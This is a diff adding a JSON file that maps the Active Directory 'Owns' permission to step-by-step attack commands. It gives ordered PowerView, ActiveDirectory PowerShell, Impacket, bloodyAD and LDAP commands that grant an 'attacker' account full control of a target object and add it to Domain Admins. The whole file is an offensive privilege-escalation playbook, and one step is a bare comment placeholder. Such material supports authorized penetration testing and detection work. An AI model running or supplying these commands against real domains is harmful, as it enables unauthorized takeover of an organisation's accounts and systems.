@@ -1,0 +1,107 @@
+{
+    "Owns": {
+        "meaning": "Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL. With ownership of the object, you may modify the DACL of the object however you wish.",
+        "common": "",
+        "windows": {
+            "PowerView_Ownership": [
+                {
+                    "order": 1,
+                    "command": "Import-Module PowerView",
+                    "description": "Import PowerView module"
+                },
+                {
+                    "order": 2,
+                    "command": "Get-DomainObjectOwner -Identity 'CN=Target,CN=Users,DC=domain,DC=com'",
+                    "description": "Verify ownership of target object"
+                },
+                {
+                    "order": 3,
+                    "command": "Add-DomainObjectAcl -TargetIdentity 'Target' -PrincipalIdentity 'attacker' -Rights All",
+                    "description": "Grant full control permissions using ownership privilege"
+                }
+            ],
+            "PowerView_DACL_Modification": [
+                {
+                    "order": 1,
+                    "command": "Import-Module PowerView",
+                    "description": "Import PowerView module"
+                },
+                {
+                    "order": 2,
+                    "command": "Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -Rights WriteMembers",
+                    "description": "Grant WriteMembers permission on group using ownership"
+                },
+                {
+                    "order": 3,
+                    "command": "Add-DomainGroupMember -Identity 'Domain Admins' -Members 'attacker'",
+                    "description": "Add attacker to privileged group"
+                }
+            ],
+            "ActiveDirectory_PowerShell": [
+                {
+                    "order": 1,
+                    "command": "Import-Module ActiveDirectory",
+                    "description": "Import Active Directory PowerShell module"
+                },
+                {
+                    "order": 2,
+                    "command": "$acl = Get-Acl 'AD:CN=Target,CN=Users,DC=domain,DC=com'",
+                    "description": "Get current ACL of target object"
+                },
+                {
+                    "order": 3,
+                    "command": "$accessRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule('attacker','FullControl','Allow')",
+                    "description": "Create new access rule granting full control"
+                },
+                {
+                    "order": 4,
+                    "command": "$acl.SetAccessRule($accessRule); Set-Acl -Path 'AD:CN=Target,CN=Users,DC=domain,DC=com' -AclObject $acl",
+                    "description": "Apply modified ACL to target object"
+                }
+            ]
+        },
+        "linux": {
+            "Impacket_owneredit": [
+                {
+                    "order": 1,
+                    "command": "python3 owneredit.py -action read -target-dn 'CN=Target,CN=Users,DC=domain,DC=com' domain.com/user:password",
+                    "description": "Verify current ownership of target object"
+                },
+                {
+                    "order": 2,
+                    "command": "python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'attacker' -target 'CN=Target,CN=Users,DC=domain,DC=com' domain.com/user:password",
+                    "description": "Modify DACL using ownership privilege"
+                }
+            ],
+            "BloodyAD": [
+                {
+                    "order": 1,
+                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get object 'CN=Target,CN=Users,DC=domain,DC=com' --attr nTSecurityDescriptor",
+                    "description": "Check current security descriptor and ownership"
+                },
+                {
+                    "order": 2,
+                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD add acl 'CN=Target,CN=Users,DC=domain,DC=com' 'attacker' 'FullControl'",
+                    "description": "Add full control ACE using ownership privilege"
+                }
+            ],
+            "LDAP_Manual": [
+                {
+                    "order": 1,
+                    "command": "ldapsearch -x -D 'CN=owner,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com -b 'CN=Target,CN=Users,DC=domain,DC=com' nTSecurityDescriptor",
+                    "description": "Query current security descriptor of owned object"
+                },
+                {
+                    "order": 2,
+                    "command": "# Create LDIF with modified security descriptor",
+                    "description": "Prepare LDAP modification with new ACEs"
+                },
+                {
+                    "order": 3,
+                    "command": "ldapmodify -x -D 'CN=owner,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com -f modify_dacl.ldif",
+                    "description": "Apply DACL modifications using ownership rights"
+                }
+            ]
+        }
+    }
+}
